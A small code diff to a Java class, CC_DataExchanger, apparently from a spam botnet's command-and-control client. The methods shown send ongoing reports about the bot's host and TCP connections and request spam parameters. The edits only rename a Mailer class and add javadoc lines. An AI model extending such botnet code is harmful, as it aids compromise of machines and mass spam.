@@ -89,10 +89,11 @@ public class CC_DataExchanger {
      * @param tcpConnections
      * @param debug
      * @return 
+     * @throws java.io.IOException 
      *************************************/
     public String sendOngoingReport(bot theBot, String tcpConnections, Boolean debug) throws IOException{
         HostDetails theHost = new HostDetails();
-        Mailer theMailer = new Mailer(theBot);
+        mailer theMailer = new mailer(theBot);
         
         String[][] thePostArray = new String[6][2];
         
@@ -149,9 +150,10 @@ public class CC_DataExchanger {
      * @param theBot
      * @param debug
      * @return 
+     * @throws java.io.IOException 
      *******************************************/
     public static String requestSpamParameters (bot theBot, Boolean debug) throws IOException {
-        Mailer theMailer = new Mailer(theBot);
+        mailer theMailer = new mailer(theBot);
         
         String[][] thePostArray = new String[4][2];
         
